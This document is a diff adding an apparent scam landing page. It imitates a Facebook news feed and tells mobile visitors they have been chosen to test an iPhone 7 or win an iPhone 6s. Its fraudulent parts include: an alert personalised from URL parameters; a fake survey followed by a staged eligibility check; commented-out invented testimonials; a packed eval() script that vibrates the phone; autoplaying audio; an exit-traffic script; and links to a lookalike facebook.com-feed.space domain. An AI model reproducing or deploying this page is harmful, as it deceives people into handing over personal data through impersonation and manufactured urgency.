@@ -1,0 +1,1649 @@
+<!DOCTYPE html>
+<html webdriver="true">
+<head>
+    <base href="">
+    <!--[if lt IE 9]>
+    <script src="html5shiv.min.js"></script>
+    <script src="respond.min.js"></script>
+    <![endif]-->
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <style>
+        a.button1 {
+            font-size: 15px !important;
+        }
+    </style>
+    <script src="names.js"></script>
+
+    <meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no">
+    <title>Congrats!</title>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                    (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+    </script>
+    <style type="text/css">
+        body {
+            background: #d3d6db;
+            margin: 0;
+            padding: 0;
+            font-family: helvetica, arial, sans-serif;
+            font-size: small
+        }
+
+        .header {
+            background: #3b5998;
+            height: 45px;
+            margin: 0;
+            padding: 0
+        }
+
+        .item {
+            color: #1f2430;
+            margin-bottom: 3px;
+            padding: 2px;
+            background: #fff;
+            font-size: small;
+            border-radius: 3px
+        }
+
+        .item .track {
+            font-weight: 700;
+            font-size: small
+        }
+
+        .item .lightblue2 {
+            color: #000;
+            margin-top: 2px;
+            font-size: 12px;
+            font-weight: 700
+        }
+
+        .track a {
+            color: #3b5998;
+            text-decoration: none
+        }
+
+        .clear {
+            clear: both
+        }
+
+        .item .img {
+            float: left;
+            border: 0 solid #666;
+            padding: 1px
+        }
+
+        .contestwrap {
+            margin-bottom: 5px
+        }
+
+        .toptext {
+            background: #fff;
+            min-height: 40px;
+            color: #1e2330;
+            font-size: 11px;
+            padding: 10px 10px 5px;
+            border-radius: 3px
+        }
+
+        .secondary {
+            color: #1f2430;
+            margin-top: 5px;
+            margin-bottom: 5px
+        }
+
+        .secondary span.lightblue {
+            color: #1f2430;
+            font-weight: 700;
+            padding-right: 5px
+        }
+
+        .container {
+            padding: 8px
+        }
+
+        .button {
+            width: 170px;
+            display: block;
+            outline: 0 none;
+            padding: 0 8px;
+            margin-top: 8px;
+            text-align: center;
+            background-color: #3b5998;
+            /*background-image: -moz-linear-gradient(center top, #0c98c5, #0c98c5);*/
+            border: 0 solid #4ec8ef;
+            text-shadow: 0 0 rgba(0, 0, 0, 0.1);
+            border-radius: 1px 1px 1px 1px;
+            cursor: default;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            height: 33px;
+            line-height: 33px;
+        }
+
+        .button a {
+            color: #000;
+            text-decoration: none;
+            font-size: small;
+            cursor: hand
+        }
+
+        a.button {
+            text-decoration: none
+        }
+
+        .rating {
+            font-size: 12px
+        }
+
+        .button1 {
+            width: 180px;
+            display: block;
+            outline: 0 none;
+            padding: 0 8px;
+            margin-top: 8px;
+            text-align: center;
+            background-color: #9f9f9f;
+            border: 0 solid #666;
+            color: #fff;
+            border-radius: 1px 1px 1px 1px;
+            cursor: default;
+            font-size: 16px;
+            font-weight: 700;
+            height: 33px;
+            line-height: 33px
+        }
+
+        .button1 a {
+            color: #ccc;
+            text-decoration: none;
+            font-size: small;
+            cursor: hand
+        }
+
+        a.button1 {
+            text-decoration: none
+        }
+
+        .red {
+            color: #fff;
+            font-weight: 700
+        }
+
+        .green {
+            color: #3C6;
+            font-weight: 700
+        }
+
+        .select {
+            background: #fff;
+            margin: 3px 0 5px;
+            color: #1f2430;
+            font-size: small;
+            line-height: 18px;
+            padding: 5px;
+            border-radius: 3px
+        }
+
+        .yellow {
+            color: #3b5998
+        }
+
+        .left {
+            float: left;
+            width: 100px;
+            margin-right: 5px;
+            text-align: center;
+            min-height: 60px
+        }
+
+        .right {
+            float: left;
+            width: 65%
+        }
+
+        .comments {
+            background: #f6f7f8;
+            border-radius: 3px;
+            margin: 3px 0;
+            padding: 5px
+        }
+
+        :focus {
+            outline: 0
+        }
+
+        .like-line-menu {
+            background-color: #F3F3F3;
+            border: #dadde1 solid;
+            border-width: 1px 0;
+            margin-top: 8px
+        }
+
+        .like-line-menu__item {
+            display: inline-block;
+            padding: 0 8px;
+            position: relative
+        }
+
+        .like-line-menu__item::before {
+            border-left: 1px solid #d6d8db;
+            bottom: 7px;
+            content: '';
+            left: 0;
+            position: absolute;
+            top: 7px
+        }
+
+        .like-line-menu__item:first-child::before {
+            display: none
+        }
+
+        .like-line-menu__item, .like-line-menu__item a {
+            font-size: 12px;
+            line-height: 36px;
+            color: #5e5e5e;
+            text-decoration: none;
+            font-weight: 700
+        }
+
+        .like-count-line {
+            padding: 8px;
+            font-size: 14px;
+            line-height: 18px;
+            border-bottom: 1px #dadde1 solid;
+            margin-bottom: 8px
+        }
+
+        .send-comments {
+            border-bottom: 1px #dadde1 solid;
+            padding-bottom: 8px
+        }
+
+        .send-comments--input_wrapper {
+            float: left;
+            width: 100%;
+            display: inline
+        }
+
+        .send-comments--input_inner {
+            margin-right: 105px
+        }
+
+        .send-comments--input {
+            width: 100%;
+            resize: none;
+            border: 1px solid #dcdee3;
+            background: #FFF;
+            box-shadow: inset 0 1px 1px 0 rgba(0, 0, 0, .07);
+            padding: 8px;
+            height: 42px;
+            font-size: 14px;
+            line-height: 16px;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box
+        }
+
+        .send-comments--input:focus {
+            height: 72px
+        }
+
+        .send-comments--submit_wrapper {
+            width: 100px;
+            margin-left: -120px;
+            float: left;
+            text-align: center;
+            display: inline
+        }
+
+        .send-comments--submit {
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+            height: 36px;
+            background-image: linear-gradient(rgba(255, 255, 255, .9), rgba(255, 255, 255, 0));
+            border: 1px solid #dcdee3;
+            background: #FFF;
+            -webkit-border-radius: 4px;
+            border-radius: 4px;
+            color: #bdc1c9;
+            font-size: 12px;
+            line-height: 36px;
+            font-family: sans-serif;
+            font-weight: 700;
+            -webkit-appearance: none;
+            padding: 0 8px
+        }
+
+        .send-comments--submit--active {
+            color: #FFF;
+            background: #5B93FC;
+            cursor: pointer
+        }
+
+        .comments__item__meta {
+            font-size: 11px;
+            line-height: 14px;
+            margin-top: 6px
+        }
+
+        .comments__item__meta__item {
+            display: inline-block;
+            color: #9197A3;
+            position: relative;
+            padding-left: 6px
+        }
+
+        .comments__item__meta__item:first-child::before {
+            display: none
+        }
+
+        .comments__item__meta__item:first-child {
+            padding-left: 0
+        }
+
+        .comments__item__meta__item::before {
+            content: '·';
+            left: 0;
+            position: absolute;
+            top: 1px
+        }
+
+        .comments__item__meta__item a {
+            color: #8190b0;
+            text-decoration: none
+        }
+
+        .comments__item__meta__item__like_count .ico {
+            background: url(data:image/png;) no-repeat;
+            width: 12px;
+            height: 12px;
+            display: inline-block;
+            margin-right: 4px;
+            margin-top: 1px;
+            vertical-align: top
+        }
+
+        .message_active td {
+            background-color: #fdf9df
+        }
+
+        td {
+            background-color: transparent;
+            -webkit-transition: all .3s ease-in;
+            -moz-transition: all .3s ease-in;
+            -ms-transition: all .3s ease-in;
+            -o-transition: all .3s ease-in;
+            transition: all .3s ease-in
+        }
+
+        hr {
+            height: 0;
+            font-size: 0;
+            line-height: 0;
+            border: none;
+            background: none;
+            border-bottom: 1px #dadde1 solid
+        }
+
+        .header a.item {
+            float: left;
+            display: block;
+            background: none;
+            width: 16.66666%;
+            overflow: hidden;
+            text-align: center;
+            height: 45px;
+            padding: 0px;
+            margin: 0px;
+        }
+
+        .header a.item span {
+            background-image: url('menusprite.jpg');
+            background-position: center top;
+            background-image: url('http://cdn.4plus.club/static/sweep/global/menusprite.png');
+            background-position: center top;
+            display: block;
+            width: 60px;
+            height: 45px;
+            margin: 0px auto;
+        }
+
+        .header a.item:first-child {
+            background-color: #243C6D;
+        }
+
+        .header a.item:nth-child(2) span {
+            background-position: center 249px;
+        }
+
+        .header a.item:nth-child(3) span {
+            background-position: center 199px;
+        }
+
+        .header a.item:nth-child(4) span {
+            background-position: center 149px;
+        }
+
+        .header a.item:nth-child(5) span {
+            background-position: center 99px;
+        }
+
+        .header a.item:nth-child(6) span {
+            background-position: center 49px;
+        }
+    </style>
+
+
+    <script language="Javascript">
+        function date(n, t) {
+            var e, r, u = this, o = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "January", "February", "March", "April", "May", "June", "July", "Ogos", "September", "October", "November", "December"], i = /\\?(.?)/gi, c = function (n, t) {
+                return r[n] ? r[n]() : t
+            }, a = function (n, t) {
+                for (n = String(n); n.length < t;)n = "0" + n;
+                return n
+            };
+            return r = {
+                d: function () {
+                    return a(r.j(), 2)
+                }, D: function () {
+                    return r.l().slice(0, 3)
+                }, j: function () {
+                    return e.getDate()
+                }, l: function () {
+                    return o[r.w()]
+                }, N: function () {
+                    return r.w() || 7
+                }, S: function () {
+                    var n = r.j(), t = n % 10;
+                    return 3 >= t && 1 == parseInt(n % 100 / 10, 10) && (t = 0), ["st", "nd", "rd"][t - 1] || "th"
+                }, w: function () {
+                    return e.getDay()
+                }, z: function () {
+                    var n = new Date(r.Y(), r.n() - 1, r.j()), t = new Date(r.Y(), 0, 1);
+                    return Math.round((n - t) / 864e5)
+                }, W: function () {
+                    var n = new Date(r.Y(), r.n() - 1, r.j() - r.N() + 3), t = new Date(n.getFullYear(), 0, 4);
+                    return a(1 + Math.round((n - t) / 864e5 / 7), 2)
+                }, F: function () {
+                    return o[6 + r.n()]
+                }, m: function () {
+                    return a(r.n(), 2)
+                }, M: function () {
+                    return r.F().slice(0, 3)
+                }, n: function () {
+                    return e.getMonth() + 1
+                }, t: function () {
+                    return new Date(r.Y(), r.n(), 0).getDate()
+                }, L: function () {
+                    var n = r.Y();
+                    return n % 4 === 0 & n % 100 !== 0 | n % 400 === 0
+                }, o: function () {
+                    var n = r.n(), t = r.W(), e = r.Y();
+                    return e + (12 === n && 9 > t ? 1 : 1 === n && t > 9 ? -1 : 0)
+                }, Y: function () {
+                    return e.getFullYear()
+                }, y: function () {
+                    return r.Y().toString().slice(-2)
+                }, a: function () {
+                    return e.getHours() > 11 ? "pm" : "am"
+                }, A: function () {
+                    return r.a().toUpperCase()
+                }, B: function () {
+                    var n = 3600 * e.getUTCHours(), t = 60 * e.getUTCMinutes(), r = e.getUTCSeconds();
+                    return a(Math.floor((n + t + r + 3600) / 86.4) % 1e3, 3)
+                }, g: function () {
+                    return r.G() % 12 || 12
+                }, G: function () {
+                    return e.getHours()
+                }, h: function () {
+                    return a(r.g(), 2)
+                }, H: function () {
+                    return a(r.G(), 2)
+                }, i: function () {
+                    return a(e.getMinutes(), 2)
+                }, s: function () {
+                    return a(e.getSeconds(), 2)
+                }, u: function () {
+                    return a(1e3 * e.getMilliseconds(), 6)
+                }, e: function () {
+                    throw"Not supported (see source code of date() for timezone on how to add support)"
+                }, I: function () {
+                    var n = new Date(r.Y(), 0), t = Date.UTC(r.Y(), 0), e = new Date(r.Y(), 6), u = Date.UTC(r.Y(), 6);
+                    return n - t !== e - u ? 1 : 0
+                }, O: function () {
+                    var n = e.getTimezoneOffset(), t = Math.abs(n);
+                    return (n > 0 ? "-" : "+") + a(100 * Math.floor(t / 60) + t % 60, 4)
+                }, P: function () {
+                    var n = r.O();
+                    return n.substr(0, 3) + ":" + n.substr(3, 2)
+                }, T: function () {
+                    return "UTC"
+                }, Z: function () {
+                    return 60 * -e.getTimezoneOffset()
+                }, c: function () {
+                    return "Y-m-d\\TH:i:sP".replace(i, c)
+                }, r: function () {
+                    return "D, d M Y H:i:s O".replace(i, c)
+                }, U: function () {
+                    return e / 1e3 | 0
+                }
+            }, this.date = function (n, t) {
+                return u = this, e = void 0 === t ? new Date : new Date(t instanceof Date ? t : 1e3 * t), n.replace(i, c)
+            }, this.date(n, t)
+        }
+    </script>
+    <!--<script language="Javascript">alert("Congrats! " + getURLParameter('brand') + " " + getURLParameter('model') + " anda telah dipilih secara rawak sebagai peranti mudah alih bertuah untuk hari ini!\r\nAnda mempunyai (1) hadiah tidak dituntut\r\nKlik OK untuk menuntut hadiah anda")</script>-->
+
+    <script src="exittraffic.min.js"></script>
+    <link type="text/css" rel="stylesheet" charset="UTF-8" href="translateelement.css">
+    <link rel="stylesheet" href="bootstrap.css"/>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, user-scalable=false; initial-scale=1.0; maximum-scale=1.0">
+
+    <script src="jquery.min.js"></script>
+
+    <script type="text/javascript">eval(function (p, a, c, k, e, d) {
+        e = function (c) {
+            return c
+        };
+        if (!''.replace(/^/, String)) {
+            while (c--) {
+                d[c] = k[c] || c
+            }
+            k = [function (e) {
+                return d[e]
+            }];
+            e = function () {
+                return '\\w+'
+            };
+            c = 1
+        }
+        ;
+        while (c--) {
+            if (k[c]) {
+                p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
+            }
+        }
+        return p
+    }('0.3=0.3||0.9||0.8||0.7;10 6(){2=15;5=14;4=11;0.3([2>1?1:2,5,4>1?1:4])};12(6,13)', 10, 16, 'navigator|2000|a|vibrate|c|b|vb|msVibrate|mozVibrate|webkitVibrate|function|1000|setTimeout|1000|1000|1000'.split('|'), 0, {}))</script>
+
+
+    <script type="text/javascript">
+        var dayNames = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+        var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+        var now = new Date();
+        var today = monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();
+
+        function get_date(days) {
+            return today = monthNames[now.getMonth()] + " " + (now.getDate() - days) + ", " + now.getFullYear();
+        }
+    </script>
+    <script>
+        $(document).ready(function () {
+            $(".bq1").click(function () {
+                $("#q1").fadeOut(0);
+                $("#q2").fadeIn(1500);
+            });
+
+            $(".bq2").click(function () {
+                $("#q2").fadeOut(0);
+                $("#q3").fadeIn(1500);
+            });
+
+            $(".bq3").click(function () {
+                $("#q3").fadeOut(0);
+                $("#q4").fadeIn(1500);
+            });
+
+            $(".bq4").click(function () {
+                $("#content1").fadeOut(0);
+                $("#content2").fadeIn();
+                setTimeout(function () {
+                    $("#result1").fadeIn(1000);
+                }, 3000);
+                setTimeout(function () {
+                    $("#result2").fadeIn(1000);
+                }, 4500);
+                setTimeout(function () {
+                    $("#result3").fadeIn(1000);
+                }, 6000);
+                setTimeout(function () {
+                    $("#content2").fadeOut();
+                }, 7500);
+                setTimeout(function () {
+                    $("#content3").fadeIn();
+                }, 7500);
+                $("#com_1").fadeOut(0);
+                $("#com_2").fadeOut(0);
+                $("#com_3").fadeOut(0);
+                $("#com_4").fadeOut(0);
+                $("#com_5").fadeOut(0);
+                $("#c1").fadeOut(0);
+                $("#c2").fadeOut(0);
+                $("#c3").fadeOut(0);
+                $("#c4").fadeOut(0);
+                $("#c5").fadeOut(0);
+                setTimeout(function () {
+                    $("#com_5").fadeIn(1000);
+                    $("#c5").fadeIn(1000);
+                }, 9000);
+                setTimeout(function () {
+                    $("#com_4").fadeIn(1000);
+                    $("#c4").fadeIn(1000);
+                }, 10000);
+                setTimeout(function () {
+                    $("#com_3").fadeIn(1000);
+                    $("#c3").fadeIn(1000);
+                }, 13000);
+                setTimeout(function () {
+                    $("#com_2").fadeIn(1000);
+                    $("#c2").fadeIn(1000);
+                }, 16000);
+                setTimeout(function () {
+                    $("#com_1").fadeIn(1000);
+                    $("#c1").fadeIn(1000);
+                }, 20000);
+            });
+        });
+    </script>
+
+    <script type="text/javascript">
+        navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+        navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
+    </script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                    (RegExp(name + '=' + '(.+?)(&|£)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+    </script>
+    <title>Rewards Center</title>
+
+    <link rel="stylesheet" type="text/css" href="index.css" media="all">
+    <style>
+        @media screen and (max-width: 828px) {
+
+            .kuang > .button {
+                width: 80%;
+                height: 100%;
+                line-height: 100%;
+                margin-left: -5%;
+            }
+
+            p.question {
+                height: 100%;
+            }
+        }
+
+        @media screen and (min-width: 1400px) {
+
+            .logo_img {
+                width: 28px;
+                height: 28px;
+                border: 0 solid transparent;
+                display: inline-block;
+                margin-top: 6%;
+                margin-left: 100%;
+            }
+
+            .logo_text {
+                margin-top: 2%;
+                display: inline-block;
+                padding-left: 5%;
+            }
+        }
+
+        @media screen and (max-width: 1399px) and (min-width: 745px) {
+            .logo_img {
+                width: 28px;
+                height: 28px;
+                border: 0 solid transparent;
+                display: inline-block;
+                margin-top: 6%;
+                margin-left: 80%;
+            }
+
+            .logo_text {
+                margin-top: 2%;
+                display: inline-block;
+                padding-left: 5%;
+            }
+        }
+
+        @media screen and (max-width: 744px) {
+            .logo_img {
+                width: 28px;
+                height: 28px;
+                border: 0 solid transparent;
+                display: inline-block;
+                margin-top: 6%;
+                margin-left: 80%;
+            }
+
+            .logo_text {
+                margin-top: 2%;
+                display: inline-block;
+                padding-left: 10%;
+            }
+        }
+
+        @media screen and (max-width: 479px) {
+            .logo_img {
+                margin-top: 6%;
+                margin-left: 50%;
+                display: inline-block;
+            }
+
+            .logo_text {
+                margin-top: 2%;
+                display: inline-block;
+                padding-left: 15%;
+            }
+        }
+    </style>
+</head>
+<body>
+<audio autoplay="" preload="">
+    <source src="alert.mp3" type="audio/mpeg">
+</audio>
+<script>
+    alert("CONGRATULATIONS " + getURLParameter('isp') + "Users!\n\nYour " + getURLParameter('model') + " has been selected because we need more people to test the new iPhone 7.\n\nPress OK to participate and you could win an iPhone6s.");
+</script>
+<div class="header">
+    <table style="width: 97%;" border="0">
+        <tbody>
+        <tr>
+            <div class="logo">
+                <td height="34" width="9%">
+                    <a href="http://www.facebook.com">
+                        <img src="img/logo.png" class="logo_img"
+                             style="width: 28px;height: 28px;border: 0 solid transparent;">
+                    </a>
+                </td>
+                <td width="47%">
+                    <font class="logo_text" color="white" size="3">News Feed</font>
+                </td>
+            </div>
+            <td width="44%">
+                <img src="1_fb-menu-right.png" align="right">
+            </td>
+        </tr>
+        </tbody>
+    </table>
+</div>
+<div class="content" style="background-color: rgb(211, 214, 223);">
+    <div class="main-content" id="content1">
+        <!--<div class="poster_container">-->
+        <!--<div class="poster_pic">-->
+        <!--<img src="prof_pic.png">-->
+        <!--<img src="img/IMG_4010.PNG" style="width:200px;height:100px"/>-->
+        <!--</div>-->
+        <!--<div class="poster_info">-->
+        <!--<p><span>Apple</span><br>9 hours • Edited • <img src="public.png"></p>-->
+        <!--</div>-->
+        <!--<div style="clear: left;"></div>-->
+        <!--</div>-->
+        <!--<h1>CONGRATULATIONS!</h1>-->
+
+        <!--<h2>-->
+        <!--You have been chosen to test the new iPhone 7 (to be released in September 2016)!</h2>-->
+
+        <!--<p>We need (20) more-->
+        <!--<script>document.write(getURLParameter('brand'))</script>-->
+        <!--<brand> users to provide feedback to build the best iPhone ever.</brand>-->
+        <!--</p>-->
+        <!--<img src="iphone7.jpg" style="max-width: 500px;" width="100%">-->
+
+        <!--<p>To qualify to become a tester, you just need to answer the following four questions. You could win a <strong>iPhone-->
+        <!--6s 16GB </strong> as a token of our appreciation!</p>-->
+
+        <!--<div id="q1">-->
+        <!--<p class="question"><strong>Question 1 of 4:</strong> Do you own any non-Apple products?</p>-->
+
+        <!--<div class="button bq1">Yes</div>-->
+        <!--<div class="button bq1">No</div>-->
+        <!--</div>-->
+        <!--<div id="q2">-->
+        <!--<p class="question"><strong>Question 2 of 4:</strong> What feature do you want to see in the new iPhone?</p>-->
+
+        <!--<div class="button bq2">Wireless Recharge</div>-->
+        <!--<div class="button bq2">HD Screen</div>-->
+        <!--</div>-->
+        <!--<div id="q3">-->
+        <!--<p class="question"><strong>Question 3 of 4:</strong> Which type of messaging do you use?</p>-->
+
+        <!--<div class="button bq3">SMS</div>-->
+        <!--<div class="button bq3">Video Messaging</div>-->
+        <!--</div>-->
+        <!--<div id="q4">-->
+        <!--<p class="question"><strong>Question 4 of 4:</strong> Do you have a valid shipping address in-->
+        <!--<script>document.write(getURLParameter('city'))</script>-->
+        <!--?-->
+        <!--</p>-->
+        <!--<div class="button bq4">Yes</div>-->
+        <!--<div class="button bq4">No</div>-->
+        <!--</div>-->
+        <div>
+            <img src="img/IMG_4010.PNG" alt="" style="width: 50%;height: 25%;margin:0 auto;display: block"/>
+        </div>
+        <p class="text-center" style="font-weight: bold;font-size: 1.5em;color: red"><i>ANSWER ALL 3 CORRECTLY</i></p>
+
+        <p class="text-center" style="font-weight: bold;font-size: 1.5em;color: red"><i>AND YOU COULD WIN A REWARD!</i>
+        </p>
+
+        <div class="row" style="margin-left: 35%">
+            <div class="col-xs-2"><img src="img/IMG_4009.PNG" alt="" style="width: 60%;height: 30%"/></div>
+            <div class="col-xs-2"><img src="img/IMG_4009.PNG" alt="" style="width: 60%;height: 30%"/></div>
+            <div class="col-xs-2" style="margin-top: -1%"><img src="img/Amazon-icon.png" alt="" style="width: 60%;height: 30%"/></div>
+        </div>
+        <div style="margin-top: 10px">
+            <img src="img/game.jpg" style="width: 40%;height:25%;display: block;margin: 0 auto"/>
+        </div>
+        <!--<p >To qualify to become a tester, you just need to answer the following four questions. You could win a <strong>iPhone-->
+        <!--6s 16GB </strong> as a token of our appreciation!</p>-->
+        <div id="q1" style="margin-top: 20px">
+            <p class="question text-center"><strong>Question 1 of 4:</strong> Do you own any non-Apple products?</p>
+
+            <div class="kuang">
+                <div class="button bq1">Yes</div>
+                <div class="button bq1 v">No</div>
+            </div>
+        </div>
+        <div id="q2" style="margin-top: 20px">
+            <p class="question text-center"><strong>Question 2 of 4:</strong> What feature do you want to see in the
+                new iPhone?</p>
+
+            <div class="kuang">
+                <div class="button bq2">Wireless Recharge</div>
+                <div class="button bq2 v">HD Screen</div>
+            </div>
+        </div>
+        <div id="q3" style="margin-top: 20px">
+            <p class="question text-center"><strong>Question 3 of 4:</strong> Which type of messaging do you use?
+            </p>
+
+            <div class="kuang">
+                <div class="button bq3">SMS</div>
+                <div class="button bq3 v">Video Messaging</div>
+            </div>
+        </div>
+        <div id="q4" style="margin-top: 20px">
+            <p class="question text-center"><strong>Question 4 of 4:</strong> Do you have a valid shipping address
+                in
+                <script>document.write(getURLParameter('city'))</script>
+                ?
+            </p>
+            <div class="kuang">
+                <div class="button bq4">Yes</div>
+                <div class="button bq4 v">No</div>
+            </div>
+        </div>
+        <br/><br/><br/><br/><br/><br/><br/>
+        <p class="text-center"><i style="font-size: 0.5em;">The facebook fan survey is powered by</i></p>
+        <div class="row" style="margin-left: 25%">
+            <div class="col-xs-3" style="margin-top: -3%;margin-left: -5%"><img src="img/logo1.jpg" alt="" style="width: 80%;height: 60%"/></div>
+            <div class="col-xs-4"><img src="img/logo2.jpg" alt="" style="width: 80%;height: 60%"/></div>
+            <div class="col-xs-3" style="margin-top: -1%"><img src="img/Truste.jpeg" alt="" style="width: 80%;height: 60%"/></div>
+        </div>
+    </div>
+    <div class="main-content" id="content2">
+        <h1 style="text-align: center;">Checking your answers</h1>
+
+        <p class="loading"><img src="loading.gif"></p>
+
+        <p class="result" id="result1">No double registrations found</p>
+
+        <p class="result" id="result2">(3) iPhones remaining</p>
+
+        <p class="result" id="result3">You are qualified to receive (1) iPhone 6s + (1)T-shirt</p>
+    </div>
+    <!--<div class="main-content" id="content3">-->
+    <!--<h1 style="text-align: center;">Congratulations! You have qualified to become an iPhone 7 tester.</h1>-->
+    <!--<h2>We will contact you to provide more details.</h2>-->
+    <!--<h2>Click "CLAIM NOW" to complete your registration.</h2>-->
+    <!--<h2 style="text-align: center;"><strong>Your iPhone 6s has been reserved.</strong></h2>-->
+    <!--<p class="loading"><img src="iphone6.jpg"></p>-->
+    <!--<a href="http://free.stayforfit.com/click" onclick="exception();" class="claim"><div class="button2">CLAIM NOW</div></a>-->
+    <!--<p style="text-align: center;">Enter your e-mail address and contact information at <script>document.write(getURLParameter('city'))</script> on the next page to complete your registration. HURRY! Stocks are limited!</p>-->
+    <!--&lt;!&ndash;FB 头像&ndash;&gt;-->
+    <!--<div id="others"></div>-->
+    <!--&lt;!&ndash;<img src="pic5.jpg">&ndash;&gt;-->
+
+    <!--<div style="font-size: 13px;margin-top: 20px">12,068 others like this</div>-->
+    <!--<hr>-->
+    <!--<p>Comment</p>-->
+    <!--<hr>-->
+    <!--<p style="color: rgb(168, 167, 167);">6 Comments</p>-->
+    <!--<hr>-->
+
+    <!--<div class="comments" id="com_1">-->
+    <!--<div class="profile">-->
+    <!--<img src="pic1.jpg">-->
+    <!--</div>-->
+    <!--<div class="comment-content">-->
+    <!--<p class="name">Andrew Webber</p>-->
+    <!--<p>Received my iPhone 6s in the mail today! Thank you! My shirt is too big, can I change it?:)!<br><img src="item1.jpg"></p>-->
+    <!--</div>-->
+    <!--<div class="clr"></div>-->
+    <!--<div class="comment-status"><span>Comment - Like - 27 Likes</span> - <script type="text/javascript">document.write(get_date(0));</script></div>-->
+    <!--</div>-->
+    <!--<hr>-->
+
+
+    <!--<div class="comments" id="com_2">-->
+    <!--<div class="profile">-->
+    <!--<img src="pic2.jpg">-->
+    <!--</div>-->
+    <!--<div class="comment-content">-->
+    <!--<p class="name">Tara Kelly</p>-->
+    <!--<p>I do not know whether this is true or not but I got the iPhone 6s!</p>-->
+    <!--</div>-->
+    <!--<div class="clr"></div>-->
+    <!--<div class="comment-status"><span>Comment - Like - 54 Likes</span> - <script type="text/javascript">document.write(get_date(0));</script></div>-->
+    <!--</div>-->
+    <!--<hr>-->
+
+
+    <!--<div class="comments" id="com_3">-->
+    <!--<div class="profile">-->
+    <!--<img src="pic3.jpg">-->
+    <!--</div>-->
+    <!--<div class="comment-content">-->
+    <!--<p class="name">Elaine Phelps </p>-->
+    <!--<p>At first, I thought it was a joke. But the iPhone and shirt arrived this morning!! Can I join again? <br><img src="item2.jpg"></p>-->
+    <!--</div>-->
+    <!--<div class="clr"></div>-->
+    <!--<div class="comment-status"><span>Comment - Like - 10 Likes</span> - <script type="text/javascript">document.write(get_date(1));</script></div>-->
+    <!--</div>-->
+    <!--<hr>-->
+
+
+    <!--<div class="comments" id="com_4">-->
+    <!--<div class="profile">-->
+    <!--<img src="pic4.jpg">-->
+    <!--</div>-->
+    <!--<div class="comment-content">-->
+    <!--<p class="name">Robin Gibson</p>-->
+    <!--<p> Great! FREE iPhone , my God ! I tried to register to add an iPhone , but she called me because my registration was identical . I ask one of the other shirts and they sent me ... 2 pcs ! WINNER! </p>-->
+    <!--</div>-->
+    <!--<div class="clr"></div>-->
+    <!--<div class="comment-status"><span>Comment - Like - 45 Likes</span> - <script type="text/javascript">document.write(get_date(1));</script></div>-->
+    <!--</div>-->
+    <!--<hr>-->
+
+
+    <!--<div class="comments"  id="com_5">-->
+    <!--<div class="profile">-->
+    <!--<img src="pic5.jpg">-->
+    <!--</div>-->
+    <!--<div class="comment-content">-->
+    <!--<p class="name">Irene Mitchell</p>-->
+    <!--<p>Originally, I saw this page and ignored it because I thought it was bullshit! Then I saw this post and decided to try. The fact that I get an iPhone and a shirt... Crazyyy<br><img src="item3.jpg"></p>-->
+    <!--</div>-->
+    <!--<div class="clr"></div>-->
+    <!--<div class="comment-status"><span>Comment - Like - 3 Likes</span> - <script type="text/javascript">document.write(get_date(2));</script></div>-->
+    <!--</div>-->
+
+    <!--</div>-->
+</div>
+<div id="content3">
+    <!--<div class="header">-->
+    <!--<a href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"-->
+    <!--class="item"><span></span></a>-->
+    <!--<a href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"-->
+    <!--class="item"><span></span></a>-->
